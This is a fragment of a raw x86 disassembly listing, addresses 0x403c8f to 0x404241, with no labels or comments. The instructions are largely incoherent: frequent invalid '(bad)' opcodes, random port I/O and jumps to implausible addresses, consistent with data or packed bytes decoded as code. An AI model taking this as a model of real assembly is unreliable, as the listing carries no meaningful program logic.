  403c8f:	81 4f 93 26 ae f1 28 	orl    $0x28f1ae26,-0x6d(%edi)
  403c96:	12 be ee b9 af f7    	adc    -0x8504612(%esi),%bh
  403c9c:	be a9 5d 5d a9       	mov    $0xa95d5da9,%esi
  403ca1:	6e                   	outsb  %ds:(%esi),(%dx)
  403ca2:	f6 49 e4 cd          	testb  $0xcd,-0x1c(%ecx)
  403ca6:	d0 2b                	shrb   $1,(%ebx)
  403ca8:	1f                   	pop    %ds
  403ca9:	80 9d 28 3d ff 3b 71 	sbbb   $0x71,0x3bff3d28(%ebp)
  403cb0:	3b 2f                	cmp    (%edi),%ebp
  403cb2:	90                   	nop
  403cb3:	91                   	xchg   %eax,%ecx
  403cb4:	4b                   	dec    %ebx
  403cb5:	96                   	xchg   %eax,%esi
  403cb6:	40                   	inc    %eax
  403cb7:	ee                   	out    %al,(%dx)
  403cb8:	96                   	xchg   %eax,%esi
  403cb9:	4d                   	dec    %ebp
  403cba:	04 7a                	add    $0x7a,%al
  403cbc:	80 54 12 88 38       	adcb   $0x38,-0x78(%edx,%edx,1)
  403cc1:	d3 d0                	rcl    %cl,%eax
  403cc3:	3d 1f cc 2a 2b       	cmp    $0x2b2acc1f,%eax
  403cc8:	d3 a6 98 2e a2 80    	shll   %cl,-0x7f5dd168(%esi)
  403cce:	c6                   	(bad)
  403ccf:	0d 5e af 59 58       	or     $0x5859af5e,%eax
  403cd4:	e1 a6                	loope  0x403c7c
  403cd6:	2b ac a5 e7 1b 24 0c 	sub    0xc241be7(%ebp,%eiz,4),%ebp
  403cdd:	b6 cc                	mov    $0xcc,%dh
  403cdf:	85 ca                	test   %ecx,%edx
  403ce1:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce2:	8b 7b ac             	mov    -0x54(%ebx),%edi
  403ce5:	ec                   	in     (%dx),%al
  403ce6:	6a b9                	push   $0xffffffb9
  403ce8:	3d ee 59 9c 25       	cmp    $0x259c59ee,%eax
  403ced:	47                   	inc    %edi
  403cee:	ab                   	stos   %eax,%es:(%edi)
  403cef:	07                   	pop    %es
  403cf0:	fc                   	cld
  403cf1:	95                   	xchg   %eax,%ebp
  403cf2:	8a 3d 16 da e0 b4    	mov    0xb4e0da16,%bh
  403cf8:	c5 d9 07             	(bad)
  403cfb:	ff 09                	decl   (%ecx)
  403cfd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403cfe:	df 49 f9             	fisttps -0x7(%ecx)
  403d01:	28 d6                	sub    %dl,%dh
  403d03:	85 ca                	test   %ecx,%edx
  403d05:	e5 f3                	in     $0xf3,%eax
  403d07:	1e                   	push   %ds
  403d08:	f1                   	int1
  403d09:	ee                   	out    %al,(%dx)
  403d0a:	f1                   	int1
  403d0b:	cc                   	int3
  403d0c:	fb                   	sti
  403d0d:	85 db                	test   %ebx,%ebx
  403d0f:	58                   	pop    %eax
  403d10:	91                   	xchg   %eax,%ecx
  403d11:	7d ae                	jge    0x403cc1
  403d13:	8b 88 39 34 f7 70    	mov    0x70f73439(%eax),%ecx
  403d19:	95                   	xchg   %eax,%ebp
  403d1a:	38 de                	cmp    %bl,%dh
  403d1c:	09 38                	or     %edi,(%eax)
  403d1e:	ef                   	out    %eax,(%dx)
  403d1f:	eb 96                	jmp    0x403cb7
  403d21:	0e                   	push   %cs
  403d22:	b4 37                	mov    $0x37,%ah
  403d24:	bd 8d 61 8c 2d       	mov    $0x2d8c618d,%ebp
  403d29:	15 91 b5 c1 3e       	adc    $0x3ec1b591,%eax
  403d2e:	3b 69 8b             	cmp    -0x75(%ecx),%ebp
  403d31:	48                   	dec    %eax
  403d32:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d33:	d1 98 e8 a5 28 cb    	rcrl   $1,-0x34d75a18(%eax)
  403d39:	fb                   	sti
  403d3a:	86 03                	xchg   %al,(%ebx)
  403d3c:	4b                   	dec    %ebx
  403d3d:	a2 f1 9e cf bb       	mov    %al,0xbbcf9ef1
  403d42:	04 b3                	add    $0xb3,%al
  403d44:	85 f8                	test   %edi,%eax
  403d46:	4b                   	dec    %ebx
  403d47:	c4 06                	les    (%esi),%eax
  403d49:	d2 e3                	shl    %cl,%bl
  403d4b:	13 ed                	adc    %ebp,%ebp
  403d4d:	a0 cf d9 8e b1       	mov    0xb18ed9cf,%al
  403d52:	39 fe                	cmp    %edi,%esi
  403d54:	24 5f                	and    $0x5f,%al
  403d56:	eb bd                	jmp    0x403d15
  403d58:	f3 d8 ef             	repz fsubr %st(7),%st
  403d5b:	0f e1 c6             	psraw  %mm6,%mm0
  403d5e:	f8                   	clc
  403d5f:	c0 ea c2             	shr    $0xc2,%dl
  403d62:	44                   	inc    %esp
  403d63:	9f                   	lahf
  403d64:	f5                   	cmc
  403d65:	92                   	xchg   %eax,%edx
  403d66:	12 37                	adc    (%edi),%dh
  403d68:	29 66 89             	sub    %esp,-0x77(%esi)
  403d6b:	d3 f5                	shl    %cl,%ebp
  403d6d:	46                   	inc    %esi
  403d6e:	7a 46                	jp     0x403db6
  403d70:	bb 37 5a 58 77       	mov    $0x77585a37,%ebx
  403d75:	f8                   	clc
  403d76:	83 b1 4a 6b 8c fb a8 	xorl   $0xffffffa8,-0x47394b6(%ecx)
  403d7d:	26 d8 f2             	es fdiv %st(2),%st
  403d80:	bf d3 61 71 da       	mov    $0xda7161d3,%edi
  403d85:	6d                   	insl   (%dx),%es:(%edi)
  403d86:	ae                   	scas   %es:(%edi),%al
  403d87:	2d f5 0b 0a 2b       	sub    $0x2b0a0bf5,%eax
  403d8c:	c1 33 1d             	shll   $0x1d,(%ebx)
  403d8f:	90                   	nop
  403d90:	4a                   	dec    %edx
  403d91:	44                   	inc    %esp
  403d92:	00 dc                	add    %bl,%ah
  403d94:	d3 02                	roll   %cl,(%edx)
  403d96:	1b 82 0e 6d 07 1c    	sbb    0x1c076d0e(%edx),%eax
  403d9c:	bf 79 7b 8c 54       	mov    $0x548c7b79,%edi
  403da1:	e5 26                	in     $0x26,%eax
  403da3:	84 45 81             	test   %al,-0x7f(%ebp)
  403da6:	c2 91 a0             	ret    $0xa091
  403da9:	ab                   	stos   %eax,%es:(%edi)
  403daa:	8e 70 5b             	mov    0x5b(%eax),%?
  403dad:	18 e6                	sbb    %ah,%dh
  403daf:	b8 20 9d f0 cf       	mov    $0xcff09d20,%eax
  403db4:	50                   	push   %eax
  403db5:	fc                   	cld
  403db6:	91                   	xchg   %eax,%ecx
  403db7:	59                   	pop    %ecx
  403db8:	a9 5f 5e c9 70       	test   $0x70c95e5f,%eax
  403dbd:	d2 a4 f5 3c a3 1f 22 	shlb   %cl,0x221fa33c(%ebp,%esi,8)
  403dc4:	63 c5                	arpl   %eax,%ebp
  403dc6:	63 b4 b9 70 18 a2 d2 	arpl   %esi,-0x2d5de790(%ecx,%edi,4)
  403dcd:	a9 90 52 fb b5       	test   $0xb5fb5290,%eax
  403dd2:	e8 24 37 30 49       	call   0x497074fb
  403dd7:	ed                   	in     (%dx),%eax
  403dd8:	41                   	inc    %ecx
  403dd9:	54                   	push   %esp
  403dda:	39 e4                	cmp    %esp,%esp
  403ddc:	1e                   	push   %ds
  403ddd:	df f6                	fcomip %st(6),%st
  403ddf:	3b fb                	cmp    %ebx,%edi
  403de1:	c9                   	leave
  403de2:	ad                   	lods   %ds:(%esi),%eax
  403de3:	30 f6                	xor    %dh,%dh
  403de5:	54                   	push   %esp
  403de6:	0c b9                	or     $0xb9,%al
  403de8:	ca 7f 3c             	lret   $0x3c7f
  403deb:	b3 9e                	mov    $0x9e,%bl
  403ded:	78 72                	js     0x403e61
  403def:	93                   	xchg   %eax,%ebx
  403df0:	90                   	nop
  403df1:	2a 83 1d 6d 42 e5    	sub    -0x1abd92e3(%ebx),%al
  403df7:	88 ef                	mov    %ch,%bh
  403df9:	48                   	dec    %eax
  403dfa:	d9 5e ac             	fstps  -0x54(%esi)
  403dfd:	68 0b bf 0c 8f       	push   $0x8f0cbf0b
  403e02:	07                   	pop    %es
  403e03:	a0 84 b9 0e 3a       	mov    0x3a0eb984,%al
  403e08:	cc                   	int3
  403e09:	8a 65 e0             	mov    -0x20(%ebp),%ah
  403e0c:	ae                   	scas   %es:(%edi),%al
  403e0d:	2f                   	das
  403e0e:	bd fb 93 15 22       	mov    $0x221593fb,%ebp
  403e13:	4d                   	dec    %ebp
  403e14:	d7                   	xlat   %ds:(%ebx)
  403e15:	a2 c3 e0 02 16       	mov    %al,0x1602e0c3
  403e1a:	fe                   	(bad)
  403e1b:	2c 44                	sub    $0x44,%al
  403e1d:	32 b4 05 db 2d 8b 44 	xor    0x448b2ddb(%ebp,%eax,1),%dh
  403e24:	dc 80 e3 bc 05 e4    	faddl  -0x1bfa431d(%eax)
  403e2a:	9e                   	sahf
  403e2b:	c2 58 18             	ret    $0x1858
  403e2e:	f3 55                	repz push %ebp
  403e30:	60                   	pusha
  403e31:	53                   	push   %ebx
  403e32:	f7 42 ff 3a ec 14 4a 	testl  $0x4a14ec3a,-0x1(%edx)
  403e39:	ac                   	lods   %ds:(%esi),%al
  403e3a:	29 84 9a c4 78 39 f2 	sub    %eax,-0xdc6873c(%edx,%ebx,4)
  403e41:	15 03 04 71 0d       	adc    $0xd710403,%eax
  403e46:	b7 17                	mov    $0x17,%bh
  403e48:	03 98 04 5d 69 be    	add    -0x4196a2fc(%eax),%ebx
  403e4e:	a9 fb f4 c8 60       	test   $0x60c8f4fb,%eax
  403e53:	ca 41 cd             	lret   $0xcd41
  403e56:	16                   	push   %ss
  403e57:	95                   	xchg   %eax,%ebp
  403e58:	99                   	cltd
  403e59:	26 15 59 5c a6 eb    	es adc $0xeba65c59,%eax
  403e5f:	0b 7b 27             	or     0x27(%ebx),%edi
  403e62:	1e                   	push   %ds
  403e63:	7c bf                	jl     0x403e24
  403e65:	65 00 fc             	gs add %bh,%ah
  403e68:	2e b9 6d 2a 12 52    	cs mov $0x52122a6d,%ecx
  403e6e:	95                   	xchg   %eax,%ebp
  403e6f:	1b d7                	sbb    %edi,%edx
  403e71:	20 5c dd 00          	and    %bl,0x0(%ebp,%ebx,8)
  403e75:	31 9d 1b 37 80 bf    	xor    %ebx,-0x407fc8e5(%ebp)
  403e7b:	ef                   	out    %eax,(%dx)
  403e7c:	d0 aa 35 f2 3f a2    	shrb   $1,-0x5dc00dcb(%edx)
  403e82:	09 f4                	or     %esi,%esp
  403e84:	11 a7 4e c9 5f e6    	adc    %esp,-0x19a036b2(%edi)
  403e8a:	78 21                	js     0x403ead
  403e8c:	d1 68 35             	shrl   $1,0x35(%eax)
  403e8f:	68 ce e2 a6 dc       	push   $0xdca6e2ce
  403e94:	a9 51 bc 8b ac       	test   $0xac8bbc51,%eax
  403e99:	38 67 5a             	cmp    %ah,0x5a(%edi)
  403e9c:	19 09                	sbb    %ecx,(%ecx)
  403e9e:	2e e0 24             	loopne,pn 0x403ec5
  403ea1:	d2 d3                	rcl    %cl,%bl
  403ea3:	07                   	pop    %es
  403ea4:	dc ad e8 14 e2 5b    	fsubrl 0x5be214e8(%ebp)
  403eaa:	fe                   	(bad)
  403eab:	3a 33                	cmp    (%ebx),%dh
  403ead:	54                   	push   %esp
  403eae:	d7                   	xlat   %ds:(%ebx)
  403eaf:	d7                   	xlat   %ds:(%ebx)
  403eb0:	5c                   	pop    %esp
  403eb1:	51                   	push   %ecx
  403eb2:	bf 17 c8 d1 a6       	mov    $0xa6d1c817,%edi
  403eb7:	2a 13                	sub    (%ebx),%dl
  403eb9:	68 9b 4b 8f e3       	push   $0xe38f4b9b
  403ebe:	db 77 e5             	(bad) -0x1b(%edi)
  403ec1:	0a 53 c0             	or     -0x40(%ebx),%dl
  403ec4:	7a 50                	jp     0x403f16
  403ec6:	de b2 68 c9 fa 41    	fidivs 0x41fac968(%edx)
  403ecc:	59                   	pop    %ecx
  403ecd:	83 cd 6f             	or     $0x6f,%ebp
  403ed0:	74 d7                	je     0x403ea9
  403ed2:	e7 9d                	out    %eax,$0x9d
  403ed4:	2e 61                	cs popa
  403ed6:	fc                   	cld
  403ed7:	44                   	inc    %esp
  403ed8:	c4 b2 31 d3 a1 45    	les    0x45a1d331(%edx),%esi
  403ede:	ad                   	lods   %ds:(%esi),%eax
  403edf:	e7 f8                	out    %eax,$0xf8
  403ee1:	49                   	dec    %ecx
  403ee2:	e2 62                	loop   0x403f46
  403ee4:	4d                   	dec    %ebp
  403ee5:	ba 57 8b b9 d5       	mov    $0xd5b98b57,%edx
  403eea:	1c aa                	sbb    $0xaa,%al
  403eec:	d0 09                	rorb   $1,(%ecx)
  403eee:	89 67 cd             	mov    %esp,-0x33(%edi)
  403ef1:	cb                   	lret
  403ef2:	ea 3d 52 df 9a 2a 62 	ljmp   $0x622a,$0x9adf523d
  403ef9:	a8 7d                	test   $0x7d,%al
  403efb:	39 fe                	cmp    %edi,%esi
  403efd:	23 0d 20 96 1d 01    	and    0x11d9620,%ecx
  403f03:	2d 09 e6 25 a7       	sub    $0xa725e609,%eax
  403f08:	9e                   	sahf
  403f09:	49                   	dec    %ecx
  403f0a:	18 d7                	sbb    %dl,%bh
  403f0c:	4b                   	dec    %ebx
  403f0d:	52                   	push   %edx
  403f0e:	1b 74 66 77          	sbb    0x77(%esi,%eiz,2),%esi
  403f12:	0c 37                	or     $0x37,%al
  403f14:	c5 37                	lds    (%edi),%esi
  403f16:	fd                   	std
  403f17:	e1 4c                	loope  0x403f65
  403f19:	5a                   	pop    %edx
  403f1a:	12 ee                	adc    %dh,%ch
  403f1c:	49                   	dec    %ecx
  403f1d:	9e                   	sahf
  403f1e:	c3                   	ret
  403f1f:	16                   	push   %ss
  403f20:	c4 29                	les    (%ecx),%ebp
  403f22:	39 12                	cmp    %edx,(%edx)
  403f24:	85 9b 5b 36 4e 83    	test   %ebx,-0x7cb1c9a5(%ebx)
  403f2a:	91                   	xchg   %eax,%ecx
  403f2b:	55                   	push   %ebp
  403f2c:	63 0a                	arpl   %ecx,(%edx)
  403f2e:	9e                   	sahf
  403f2f:	20 c2                	and    %al,%dl
  403f31:	ec                   	in     (%dx),%al
  403f32:	77 a9                	ja     0x403edd
  403f34:	6f                   	outsl  %ds:(%esi),(%dx)
  403f35:	8a 4a ab             	mov    -0x55(%edx),%cl
  403f38:	80 d4 a6             	adc    $0xa6,%ah
  403f3b:	2f                   	das
  403f3c:	fc                   	cld
  403f3d:	f4                   	hlt
  403f3e:	33 7f 67             	xor    0x67(%edi),%edi
  403f41:	df 2b                	fildll (%ebx)
  403f43:	8d                   	lea    (bad),%esp
  403f44:	e5 b6                	in     $0xb6,%eax
  403f46:	82 fe 43             	cmp    $0x43,%dh
  403f49:	f2 4e                	repnz dec %esi
  403f4b:	25 35 f2 8b 3c       	and    $0x3c8bf235,%eax
  403f50:	c0 8b 65 9f 88 b1 3b 	rorb   $0x3b,-0x4e77609b(%ebx)
  403f57:	1d f7 41 1f f4       	sbb    $0xf41f41f7,%eax
  403f5c:	40                   	inc    %eax
  403f5d:	45                   	inc    %ebp
  403f5e:	bc d3 b9 d8 cb       	mov    $0xcbd8b9d3,%esp
  403f63:	1a 38                	sbb    (%eax),%bh
  403f65:	d7                   	xlat   %ds:(%ebx)
  403f66:	04 ea                	add    $0xea,%al
  403f68:	e3 fd                	jecxz  0x403f67
  403f6a:	e5 2d                	in     $0x2d,%eax
  403f6c:	07                   	pop    %es
  403f6d:	60                   	pusha
  403f6e:	f1                   	int1
  403f6f:	bc b4 bb 5f 38       	mov    $0x385fbbb4,%esp
  403f74:	30 38                	xor    %bh,(%eax)
  403f76:	d7                   	xlat   %ds:(%ebx)
  403f77:	b2 d8                	mov    $0xd8,%dl
  403f79:	4e                   	dec    %esi
  403f7a:	83 7d 69 bb          	cmpl   $0xffffffbb,0x69(%ebp)
  403f7e:	9d                   	popf
  403f7f:	a9 bc ee 85 ee       	test   $0xee85eebc,%eax
  403f84:	25 f5 83 79 7d       	and    $0x7d7983f5,%eax
  403f89:	fc                   	cld
  403f8a:	c0 fc 40             	sar    $0x40,%ah
  403f8d:	eb 10                	jmp    0x403f9f
  403f8f:	92                   	xchg   %eax,%edx
  403f90:	a9 a6 82 ce 93       	test   $0x93ce82a6,%eax
  403f95:	52                   	push   %edx
  403f96:	ab                   	stos   %eax,%es:(%edi)
  403f97:	a1 1b 60 1c 57       	mov    0x571c601b,%eax
  403f9c:	1f                   	pop    %ds
  403f9d:	c3                   	ret
  403f9e:	d9 43 72             	flds   0x72(%ebx)
  403fa1:	c2 06 26             	ret    $0x2606
  403fa4:	6e                   	outsb  %ds:(%esi),(%dx)
  403fa5:	d4 9b                	aam    $0x9b
  403fa7:	9a 7a 98 10 56 98 f5 	lcall  $0xf598,$0x5610987a
  403fae:	4a                   	dec    %edx
  403faf:	37                   	aaa
  403fb0:	5e                   	pop    %esi
  403fb1:	e4 82                	in     $0x82,%al
  403fb3:	f1                   	int1
  403fb4:	e9 13 f0 10 31       	jmp    0x31512fcc
  403fb9:	16                   	push   %ss
  403fba:	9c                   	pushf
  403fbb:	bd ca 8c ee a4       	mov    $0xa4ee8cca,%ebp
  403fc0:	ee                   	out    %al,(%dx)
  403fc1:	4d                   	dec    %ebp
  403fc2:	28 f6                	sub    %dh,%dh
  403fc4:	51                   	push   %ecx
  403fc5:	21 c8                	and    %ecx,%eax
  403fc7:	bc a7 a7 76 dc       	mov    $0xdc76a7a7,%esp
  403fcc:	fc                   	cld
  403fcd:	bb 6d d4 7f 8a       	mov    $0x8a7fd46d,%ebx
  403fd2:	ee                   	out    %al,(%dx)
  403fd3:	cd 81                	int    $0x81
  403fd5:	1a ed                	sbb    %ch,%ch
  403fd7:	86 9b 29 a8 00 2b    	xchg   %bl,0x2b00a829(%ebx)
  403fdd:	5f                   	pop    %edi
  403fde:	e6 91                	out    %al,$0x91
  403fe0:	43                   	inc    %ebx
  403fe1:	e8 3f 5c 5d 68       	call   0x689d9c25
  403fe6:	3e f0 ae             	ds lock scas %es:(%edi),%al
  403fe9:	12 18                	adc    (%eax),%bl
  403feb:	cf                   	iret
  403fec:	ae                   	scas   %es:(%edi),%al
  403fed:	de 68 ab             	fisubrs -0x55(%eax)
  403ff0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403ff1:	bf 14 40 65 e0       	mov    $0xe0654014,%edi
  403ff6:	01 ed                	add    %ebp,%ebp
  403ff8:	ec                   	in     (%dx),%al
  403ff9:	3f                   	aas
  403ffa:	4c                   	dec    %esp
  403ffb:	c8 3a d6 b8          	enter  $0xd63a,$0xb8
  403fff:	41                   	inc    %ecx
  404000:	33 d7                	xor    %edi,%edx
  404002:	fe                   	(bad)
  404003:	54                   	push   %esp
  404004:	ac                   	lods   %ds:(%esi),%al
  404005:	2a 0f                	sub    (%edi),%cl
  404007:	fa                   	cli
  404008:	14 73                	adc    $0x73,%al
  40400a:	83 91 0b 51 1f 2f d8 	adcl   $0xffffffd8,0x2f1f510b(%ecx)
  404011:	be 2c 08 7a 23       	mov    $0x237a082c,%esi
  404016:	68 8e 44 b1 d0       	push   $0xd0b1448e
  40401b:	20 d0                	and    %dl,%al
  40401d:	73 23                	jae    0x404042
  40401f:	10 15 c0 f2 78 47    	adc    %dl,0x4778f2c0
  404025:	d7                   	xlat   %ds:(%ebx)
  404026:	74 39                	je     0x404061
  404028:	aa                   	stos   %al,%es:(%edi)
  404029:	16                   	push   %ss
  40402a:	a8 ef                	test   $0xef,%al
  40402c:	a8 0b                	test   $0xb,%al
  40402e:	06                   	push   %es
  40402f:	4b                   	dec    %ebx
  404030:	f2 0d c7 f7 f2 e0    	repnz or $0xe0f2f7c7,%eax
  404036:	0f c9                	bswap  %ecx
  404038:	e0 17                	loopne 0x404051
  40403a:	67 77 26             	addr16 ja 0x404063
  40403d:	76 f2                	jbe    0x404031
  40403f:	cc                   	int3
  404040:	7a 22                	jp     0x404064
  404042:	63 ec                	arpl   %ebp,%esp
  404044:	f3 cd a3             	repz int $0xa3
  404047:	e9 a2 34 2f 84       	jmp    0x846f74ee
  40404c:	18 ce                	sbb    %cl,%dh
  40404e:	37                   	aaa
  40404f:	94                   	xchg   %eax,%esp
  404050:	85 5d 87             	test   %ebx,-0x79(%ebp)
  404053:	ed                   	in     (%dx),%eax
  404054:	fe                   	(bad)
  404055:	67 d8 b4 3d 2c       	fdivs  0x2c3d(%si)
  40405a:	9a 8e c3 dd 7a 26 8a 	lcall  $0x8a26,$0x7addc38e
  404061:	ee                   	out    %al,(%dx)
  404062:	fa                   	cli
  404063:	e1 19                	loope  0x40407e
  404065:	08 83 65 63 99 54    	or     %al,0x54996365(%ebx)
  40406b:	82 d7 37             	adc    $0x37,%bh
  40406e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40406f:	63 a5 21 4d b7 b3    	arpl   %esp,-0x4c48b2df(%ebp)
  404075:	ba 1a 8f e6 b9       	mov    $0xb9e68f1a,%edx
  40407a:	ed                   	in     (%dx),%eax
  40407b:	32 11                	xor    (%ecx),%dl
  40407d:	f4                   	hlt
  40407e:	eb b0                	jmp    0x404030
  404080:	97                   	xchg   %eax,%edi
  404081:	0c d2                	or     $0xd2,%al
  404083:	36 42                	ss inc %edx
  404085:	af                   	scas   %es:(%edi),%eax
  404086:	8b 57 2d             	mov    0x2d(%edi),%edx
  404089:	ef                   	out    %eax,(%dx)
  40408a:	00 e6                	add    %ah,%dh
  40408c:	c4 1b                	les    (%ebx),%ebx
  40408e:	67 af                	scas   %es:(%di),%eax
  404090:	d0 3d 26 24 fd 5b    	sarb   $1,0x5bfd2426
  404096:	2e 24 07             	cs and $0x7,%al
  404099:	c5 f8 7b             	(bad)
  40409c:	65 9d                	gs popf
  40409e:	21 4f 8b             	and    %ecx,-0x75(%edi)
  4040a1:	a2 ba a6 b1 9c       	mov    %al,0x9cb1a6ba
  4040a6:	9c                   	pushf
  4040a7:	09 45 f0             	or     %eax,-0x10(%ebp)
  4040aa:	99                   	cltd
  4040ab:	99                   	cltd
  4040ac:	64 f8                	fs clc
  4040ae:	67 a3 36 3b          	addr16 mov %eax,0x3b36
  4040b2:	82 36 a4             	xorb   $0xa4,(%esi)
  4040b5:	17                   	pop    %ss
  4040b6:	8e b6 a9 59 c2 19    	mov    0x19c259a9(%esi),%?
  4040bc:	e8 9f f5 36 85       	call   0x85773660
  4040c1:	c8 dc 39 d1          	enter  $0x39dc,$0xd1
  4040c5:	a8 0b                	test   $0xb,%al
  4040c7:	60                   	pusha
  4040c8:	b1 72                	mov    $0x72,%cl
  4040ca:	65 25 0b 1d c5 d8    	gs and $0xd8c51d0b,%eax
  4040d0:	87 01                	xchg   %eax,(%ecx)
  4040d2:	c9                   	leave
  4040d3:	0e                   	push   %cs
  4040d4:	75 ba                	jne    0x404090
  4040d6:	23 c9                	and    %ecx,%ecx
  4040d8:	48                   	dec    %eax
  4040d9:	de 82 17 d3 85 9a    	fiadds -0x657a2ce9(%edx)
  4040df:	72 f9                	jb     0x4040da
  4040e1:	33 21                	xor    (%ecx),%esp
  4040e3:	92                   	xchg   %eax,%edx
  4040e4:	2c 1e                	sub    $0x1e,%al
  4040e6:	da c1                	fcmovb %st(1),%st
  4040e8:	c2 37 3c             	ret    $0x3c37
  4040eb:	bf 43 33 17 f5       	mov    $0xf5173343,%edi
  4040f0:	0e                   	push   %cs
  4040f1:	0d 54 83 d3 94       	or     $0x94d38354,%eax
  4040f6:	35 6a e7 c1 49       	xor    $0x49c1e76a,%eax
  4040fb:	fc                   	cld
  4040fc:	32 dd                	xor    %ch,%bl
  4040fe:	ad                   	lods   %ds:(%esi),%eax
  4040ff:	b0 c1                	mov    $0xc1,%al
  404101:	aa                   	stos   %al,%es:(%edi)
  404102:	72 1f                	jb     0x404123
  404104:	c0 c4 92             	rol    $0x92,%ah
  404107:	bf e2 16 c6 af       	mov    $0xafc616e2,%edi
  40410c:	80 f6 02             	xor    $0x2,%dh
  40410f:	44                   	inc    %esp
  404110:	9f                   	lahf
  404111:	46                   	inc    %esi
  404112:	e8 6b 1f 28 87       	call   0x87686082
  404117:	24 92                	and    $0x92,%al
  404119:	81 a3 2f c8 ec 46 e6 	andl   $0x43d8e8e6,0x46ecc82f(%ebx)
  404120:	e8 d8 43 
  404123:	1a db                	sbb    %bl,%bl
  404125:	a8 67                	test   $0x67,%al
  404127:	e8 a4 44 2b 39       	call   0x396b85d0
  40412c:	4a                   	dec    %edx
  40412d:	2f                   	das
  40412e:	08 6e a5             	or     %ch,-0x5b(%esi)
  404131:	2a ce                	sub    %dh,%cl
  404133:	79 78                	jns    0x4041ad
  404135:	1f                   	pop    %ds
  404136:	d0 08                	rorb   $1,(%eax)
  404138:	0c 10                	or     $0x10,%al
  40413a:	4e                   	dec    %esi
  40413b:	4f                   	dec    %edi
  40413c:	c3                   	ret
  40413d:	52                   	push   %edx
  40413e:	6b 1e 53             	imul   $0x53,(%esi),%ebx
  404141:	0e                   	push   %cs
  404142:	22 77 ab             	and    -0x55(%edi),%dh
  404145:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404146:	10 70 db             	adc    %dh,-0x25(%eax)
  404149:	68 eb 7b 11 c1       	push   $0xc1117beb
  40414e:	de 33                	fidivs (%ebx)
  404150:	02 ae dd d0 9b 54    	add    0x549bd0dd(%esi),%ch
  404156:	36 b7 16             	ss mov $0x16,%bh
  404159:	3e 03 95 61 bc 1a 86 	add    %ds:-0x79e5439f(%ebp),%edx
  404160:	d3 6c 23 89          	shrl   %cl,-0x77(%ebx,%eiz,1)
  404164:	68 91 a1 ba 53       	push   $0x53baa191
  404169:	db 8b bd 0e 92 3d    	fisttpl 0x3d920ebd(%ebx)
  40416f:	2a 81 ef 93 ae 50    	sub    0x50ae93ef(%ecx),%al
  404175:	57                   	push   %edi
  404176:	28 be a0 66 39 10    	sub    %bh,0x103966a0(%esi)
  40417c:	f4                   	hlt
  40417d:	e0 de                	loopne 0x40415d
  40417f:	94                   	xchg   %eax,%esp
  404180:	06                   	push   %es
  404181:	39 50 de             	cmp    %edx,-0x22(%eax)
  404184:	6a 77                	push   $0x77
  404186:	9a 21 ec d2 be 42 75 	lcall  $0x7542,$0xbed2ec21
  40418d:	39 93 60 83 b9 ba    	cmp    %edx,-0x45467ca0(%ebx)
  404193:	ad                   	lods   %ds:(%esi),%eax
  404194:	fe                   	(bad)
  404195:	e2 ed                	loop   0x404184
  404197:	a2 e5 65 23 66       	mov    %al,0x662365e5
  40419c:	e7 80                	out    %eax,$0x80
  40419e:	72 72                	jb     0x404212
  4041a0:	35 a2 75 5a 55       	xor    $0x555a75a2,%eax
  4041a5:	13 a3 14 ae c6 76    	adc    0x76c6ae14(%ebx),%esp
  4041ab:	00 c8                	add    %cl,%al
  4041ad:	ac                   	lods   %ds:(%esi),%al
  4041ae:	0a 66 ad             	or     -0x53(%esi),%ah
  4041b1:	60                   	pusha
  4041b2:	1c b2                	sbb    $0xb2,%al
  4041b4:	4f                   	dec    %edi
  4041b5:	42                   	inc    %edx
  4041b6:	ba 3f 08 14 21       	mov    $0x2114083f,%edx
  4041bb:	ad                   	lods   %ds:(%esi),%eax
  4041bc:	50                   	push   %eax
  4041bd:	67 a1 d5 ed          	addr16 mov 0xedd5,%eax
  4041c1:	0f 3e                	(bad)
  4041c3:	83 da 25             	sbb    $0x25,%edx
  4041c6:	06                   	push   %es
  4041c7:	2d b1 df 90 d8       	sub    $0xd890dfb1,%eax
  4041cc:	e7 8c                	out    %eax,$0x8c
  4041ce:	3f                   	aas
  4041cf:	8d                   	lea    (bad),%edi
  4041d0:	fb                   	sti
  4041d1:	1d fe 1b 84 5d       	sbb    $0x5d841bfe,%eax
  4041d6:	3d 7c 20 77 b4       	cmp    $0xb477207c,%eax
  4041db:	51                   	push   %ecx
  4041dc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4041dd:	94                   	xchg   %eax,%esp
  4041de:	9e                   	sahf
  4041df:	fc                   	cld
  4041e0:	06                   	push   %es
  4041e1:	65 53                	gs push %ebx
  4041e3:	e5 e5                	in     $0xe5,%eax
  4041e5:	cb                   	lret
  4041e6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4041e7:	19 69 e0             	sbb    %ebp,-0x20(%ecx)
  4041ea:	d3 86 79 01 01 ec    	roll   %cl,-0x13fefe87(%esi)
  4041f0:	e6 94                	out    %al,$0x94
  4041f2:	22 25 1f f2 da f2    	and    0xf2daf21f,%ah
  4041f8:	5e                   	pop    %esi
  4041f9:	93                   	xchg   %eax,%ebx
  4041fa:	7b 92                	jnp    0x40418e
  4041fc:	eb 7d                	jmp    0x40427b
  4041fe:	ec                   	in     (%dx),%al
  4041ff:	4a                   	dec    %edx
  404200:	0a 8c 4b 8e 73 d8 1a 	or     0x1ad8738e(%ebx,%ecx,2),%cl
  404207:	a9 72 36 64 a8       	test   $0xa8643672,%eax
  40420c:	b7 40                	mov    $0x40,%bh
  40420e:	b9 1c 42 12 0f       	mov    $0xf12421c,%ecx
  404213:	b4 9f                	mov    $0x9f,%ah
  404215:	d8 a3 fa 2c cc 55    	fsubs  0x55cc2cfa(%ebx)
  40421b:	af                   	scas   %es:(%edi),%eax
  40421c:	2a 2f                	sub    (%edi),%ch
  40421e:	f9                   	stc
  40421f:	a0 2f 69 16 e4       	mov    0xe416692f,%al
  404224:	4b                   	dec    %ebx
  404225:	a9 9c 1c ff f3       	test   $0xf3ff1c9c,%eax
  40422a:	e0 51                	loopne 0x40427d
  40422c:	0a 36                	or     (%esi),%dh
  40422e:	d9 ee                	fldz
  404230:	ea 0c 91 cd 8d 26 e8 	ljmp   $0xe826,$0x8dcd910c
  404237:	56                   	push   %esi
  404238:	29 af 46 46 6f 05    	sub    %ebp,0x56f4646(%edi)
  40423e:	67 30 b2 0f 4a       	xor    %dh,0x4a0f(%bp,%si)
